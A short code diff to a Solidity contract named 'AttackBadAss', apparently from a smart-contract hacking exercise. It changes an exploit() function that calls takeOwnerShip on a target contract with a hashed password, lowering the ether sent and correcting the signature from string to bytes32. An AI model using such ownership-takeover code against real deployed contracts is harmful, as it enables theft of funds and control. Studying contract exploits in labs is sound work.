@@ -14,8 +14,8 @@ contract AttackBadAss {
     }
     
     function exploit() public payable {
-        require(msg.value == 1 ether);
-        bytes memory payload = abi.encodeWithSignature("takeOwnerShip(string)", keccak256(abi.encodePacked(password)));
+        require(msg.value == 0.01 ether);
+        bytes memory payload = abi.encodeWithSignature("takeOwnerShip(bytes32)", keccak256(abi.encodePacked(password)));
         address(originalContract).call.value(msg.value)(payload);
     }
 
